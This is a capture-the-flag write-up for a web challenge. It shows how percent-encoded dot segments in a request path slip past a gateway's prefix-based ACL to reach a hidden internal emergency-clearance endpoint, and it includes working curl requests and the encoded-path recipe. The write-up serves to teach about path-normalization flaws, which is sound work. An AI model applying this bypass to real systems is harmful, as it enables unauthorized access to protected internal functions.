# Corridor Transit Gate

> Web · Medium · Chronos Security  
> Points: 299 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{dIzjuUVx6ANPNKhInHTsfNlI}`

Each team's instance minted its own random token, so the value above is the one this instance returned; the `CSCTF{...}` in the brief is only the format template, never a lead. The real token only ever exists inside a live instance's responses. The challenge ran as a per-team container, now down; every request below is shown exactly as it was sent, with the host written as `<instance>`.

**Challenge**

An automated freight checkpoint at the Northern Viaduct has locked an emergency barrier on convoy `CTLD-FR-8821` over an axle-weight discrepancy. As the duty transit analyst you have to investigate the clearance pipeline, resolve the hold, and authorize the emergency viaduct clearance. The only handout is `api_specification.json` (6459 bytes, SHA-256 `50874d28a16cb41aee2495975fb70b40db99f374eab62f4069ad3945ab4b3b92`), an OpenAPI description of the public CTLD freight API.

**Approach / walkthrough**

*Tools:* `curl` for walking the API, and a short standard-library Python raw-socket script so the escaped request path reaches the gateway unmodified. `curl --path-as-is` does the same job.

*1. Read the spec.* `api_specification.json` is the whole public surface, and there is no auth scheme anywhere in it — everything is open:

- `GET /api/v1/corridor/status` — corridor state, advisories, max load ratings
- `POST /api/v1/corridor/assess` — `{corridor, gross_weight_kg, axles}` compliance calc
- `GET` / `POST /api/v1/consignments` and `GET /api/v1/consignments/{id}` — list / register / full docket
- `GET /api/v1/telemetry/station/{station_id}` — live weighbridge readings
- `POST /api/v1/clearance/request` — `{consignment_id}` standard clearance

*2. Walk the public routes.* `GET /api/v1/corridor/status` shows `CORRIDOR_VIADUCT_NORTH` as `RESTRICTED`, `max_gross_weight_kg: 40000`, one active hold ("Automated scale interlock active at Station CP-04"). `GET /api/v1/consignments` lists `CTLD-FR-8821`, status `HELD_AXLE_WEIGHT_DISCREPANCY`, current checkpoint `CP-04`. Its docket (`GET /api/v1/consignments/CTLD-FR-8821`) gives the `hold_reason`: "Automated WIM scale CP-04 recorded 46,200 kg against declared 22,000 kg. Viaduct structural limit is 40,000 kg," with an audit log showing `GATE_BARRIER_LOCKED`. `GET /api/v1/telemetry/station/CP-04` corroborates the `measured_weight_kg: 46200`.

*3. Ask for clearance the public way.* The one public release route rejects it, because 46,200 kg really is over the limit:

```sh
curl -s -X POST http://<instance>/api/v1/clearance/request \
  -H 'Content-Type: application/json' -d '{"consignment_id":"CTLD-FR-8821"}'
```

```json
{"error":"Corridor Capacity Exceeded","code":"ERR_AXLE_WEIGHT_DISCREPANCY",
 "status":"REJECTED_HELD_UNDER_TE160",
 "advisory":"Standard haulier clearance prohibited for overweight abnormal loads. Clearance must be authorized via internal dispatch controller."}
```

The advisory names the exit: an **internal dispatch controller**, a route not in the spec.

*4. Find the emergency route in the front end.* The site's own API docs page (`/developers`) states that "Administrative dispatch and emergency override endpoints are restricted to internal enforcement infrastructure" — so the route exists and the gateway is what keeps you out. The convoy's portal page (`/portal/consignment/CTLD-FR-8821`) loads a chunk named `chunk-dispatch-admin.9c4d.js`. Fetch it:

```sh
curl -s http://<instance>/static/assets/js/chunks/chunk-dispatch-admin.9c4d.js
```

It defines the route and the handler that prints the token:

```js
routes:{ ... internalDispatch:"/internal/dispatch/emergency-clearance" }
submitSupervisorClearance:async function(t,r){
  const o=await fetch(this.client.apiPrefix+this.client.routes.internalDispatch,{
    method:"POST",
    headers:{"Content-Type":"application/json","X-Requested-With":"XMLHttpRequest"},
    body:JSON.stringify({consignment_id:t,reason:r||"Operational emergency corridor escort"})
  });
  return{status:o.status,ok:o.ok,data:await o.json()};
}
```

So the target is `POST /api/v1/internal/dispatch/emergency-clearance` with `{consignment_id, reason}` (reason optional), and its success handler renders `e.data.clearance_token` — flag-shaped.

*5. Knock on the internal door.* Any `/api/v1/internal/*` route is answered by the edge gateway before the backend sees it:

```sh
curl -s -i http://<instance>/api/v1/internal/dispatch
```

```
HTTP/1.1 403 Forbidden
Server: CTLD-Gateway/3.2.0 (Go-ReverseProxy)
X-Gateway-Node: gateway-edge-01

{"error":"Forbidden","code":"GW_ACL_INTERNAL_ROUTE_PROHIBITED","message":"Access to internal dispatch infrastructure (/api/v1/internal/*) is restricted to authorized intranet nodes.","gateway_node":"gateway-edge-01"}
```

The gateway itself answered — note `X-Gateway-Node`, a single `Server:` header, and no `X-Engine-Node` (responses that reach the backend come back with `X-Engine-Node: dispatch-core-01` and a doubled `Server:` line). The emergency route and every method on it return the same 403. "Authorized intranet nodes" hints at headers, but `X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, a doctored `Host: dispatch-core-01` and the rest change nothing. The ACL reads the path, not headers.

*6. Slip the path past the ACL.* Probing with raw request paths shows exactly how the ACL reads the path:

| Raw path sent | Gateway says |
|---|---|
| `/api/v1/internal/dispatch/emergency-clearance` | `403 GW_ACL_INTERNAL_ROUTE_PROHIBITED` |
| `/api/v1/%69nternal/dispatch/emergency-clearance` | `403` — percent-decoding happens **before** the prefix check |
| `/api/v1/./internal/dispatch/emergency-clearance` | `301` to the canonical path |
| `/api/v1/internal%2fdispatch%2femergency-clearance` | `404 page not found` |
| `/api/v1/corridor/status/..%2finternal/dispatch/emergency-clearance` | backend `404` echoing `"path":"/api/v1/corridor/internal/dispatch/emergency-clearance"` |

That last row is the bug. The gateway routes `/api/v1/corridor/...` to the backend (a public subtree) and the ACL sees only the decoded, *uncleaned* path — which still begins `/api/v1/corridor`, so it waves the request through. The dot segments are cleaned only on the next hop, where `status/..%2finternal` collapses toward the internal handler. The recipe: stay inside a public subtree the mux will route, and climb out of it with enough escaped dot segments to land on the internal route after cleaning. `/api/v1/corridor/status/X` needs two `..` — one to cancel `status`, one to cancel `corridor` — and both must stay percent-escaped, because a literal `../` makes the Go mux answer a `301` to the cleaned path, putting you back in front of the ACL.

```
raw:     /api/v1/corridor/status/%2e%2e/%2e%2e/internal/dispatch/emergency-clearance
decoded: /api/v1/corridor/status/../../internal/dispatch/emergency-clearance  (ACL: no /api/v1/internal prefix -> pass)
cleaned: /api/v1/internal/dispatch/emergency-clearance                        (behind the ACL)
```

Escaped paths are where HTTP clients start silently rewriting, so send the request over a plain socket. The solve script (`attack_emergency_clearance.py`) opens a `socket.create_connection`, writes the request line verbatim with `Connection: close`, and fires a GET then a POST at the hidden path. The GET confirms reachability; the POST carries the body:

```sh
curl -s --path-as-is -X POST \
  'http://<instance>/api/v1/corridor/status/%2e%2e/%2e%2e/internal/dispatch/emergency-clearance' \
  -H 'Content-Type: application/json' -d '{"consignment_id":"CTLD-FR-8821"}'
```

```json
{"status":"APPROVED","clearance_id":"CTLD-EMERG-2026-1794058335","consignment_id":"CTLD-FR-8821",
 "authorized_corridor":"CORRIDOR_VIADUCT_NORTH","gate_barrier_state":"OPEN",
 "clearance_token":"CSCTF{dIzjuUVx6ANPNKhInHTsfNlI}",
 "message":"Emergency transit clearance approved. Viaduct barrier unlocked."}
```

The `..%2f..%2f` spelling works identically. The `clearance_token` is the flag.

**Why it works**

The gateway authorizes and routes on two different views of the same request target. Its ACL percent-decodes the raw path and blocks anything whose decoded form starts with `/api/v1/internal`, but it never cleans dot segments — and the Go mux routes `/api/v1/corridor/status/...` into the public corridor subtree, while the actual unquoting and dot-segment collapsing happen one hop later at the backend. Escaped dot segments (`%2e%2e`, `..%2f`) are not literal `../`, so they never trip the mux's 301-to-canonical rewrite, and the decoded path still starts with `/api/v1/corridor`, so the ACL sees a public route and steps aside. Only afterwards does `status/../..` collapse back to `/api/v1`, dropping the request onto the internal emergency-clearance handler the ACL was meant to guard.

**Validation / reproduction**

A GET on the same escaped path returned a backend `404` echoing the *cleaned* path `/api/v1/internal/dispatch/emergency-clearance` and no longer carried `GW_ACL_INTERNAL_ROUTE_PROHIBITED` — proof the internal subtree was reached cleanly before any POST was sent. The POST then returned an `APPROVED` record with `gate_barrier_state: OPEN` and the `CSCTF{...}` token, accepted on the first submission. Reproduce by walking the public routes to the held convoy, pulling `chunk-dispatch-admin.9c4d.js` for the internal route, confirming the 403 wall, then sending the two-`..%2e%2e` POST over a raw socket (or `curl --path-as-is`). Gotcha: keep the dot segments percent-escaped end to end — any client that normalizes the path, or a literal `../`, triggers the mux's 301 and bounces you back to the ACL.
